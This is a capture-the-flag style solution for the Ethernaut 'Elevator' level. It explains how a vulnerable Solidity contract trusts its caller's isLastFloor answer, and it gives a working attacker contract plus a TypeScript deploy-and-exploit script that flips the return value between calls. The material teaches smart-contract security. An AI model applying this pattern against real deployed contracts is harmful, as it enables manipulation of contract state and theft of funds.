# Solution for Ethernaut Level 11: Elevator

## Goal

The goal of this level is to reach the top of the building, which means setting the `top` variable to `true` in the `Elevator` contract.

## Vulnerability Analysis

The vulnerability lies in how the `Elevator` contract trusts the `Building` contract (the caller) to provide consistent information.

```solidity
function goTo(uint _floor) public {
  Building building = Building(msg.sender);

  if (!building.isLastFloor(_floor)) {
    floor = _floor;
    top = building.isLastFloor(floor);
  }
}
```

The `goTo` function calls `isLastFloor` twice.

1.  First, inside the `if` condition: `! building.isLastFloor(_floor)`. To enter the block, this must return `false`.
2.  Second, to set the `top` variable: `top = building.isLastFloor(floor)`. To pass the level, this must return `true`.

Since `msg.sender` is a contract that we control, we can implement `isLastFloor` to return different values for each call, effectively tricking the `Elevator`.

## The Exploit

The `exploit.ts` script uses a malicious contract, `FakeBuilding.sol`, to perform the attack.

### Step 1: The Malicious Contract (`FakeBuilding.sol`)

We deploy a contract that implements the `isLastFloor` function. It uses a state variable to toggle the return value.

```solidity
contract FakeBuilding {
  Elevator public elevator;
  bool public toggle = true;

  constructor(address _elevator) {
    elevator = Elevator(_elevator);
  }

  function isLastFloor(uint) external returns (bool) {
    toggle = !toggle;
    return toggle;
  }

  function exploit() external {
    elevator.goTo(1);
  }
}
```

When `exploit` calls `elevator.goTo(1)`:

1.  `Elevator` calls `isLastFloor`. `toggle` becomes `false`. It returns `false`.
2.  The `if (!false)` condition succeeds.
3.  `Elevator` calls `isLastFloor` again. `toggle` becomes `true`. It returns `true`.
4.  `top` is set to `true`.

### Step 2: Executing the Attack

The `exploit.ts` script orchestrates the attack:

1.  **Check Status**: It checks the current status of `top`.
2.  **Deploy Attacker**: It deploys the `FakeBuilding` contract.
3.  **Execute Exploit**: It calls `fakeBuilding.exploit()`.

```typescript
const FakeBuilding = new FakeBuilding__factory(player);
const fakeBuilding = await FakeBuilding.deploy(elevatorAddress);

await fakeBuilding.waitForDeployment();

await (await fakeBuilding.exploit()).wait();
```

After the transaction confirms, the `Elevator`'s `top` variable will be `true`.
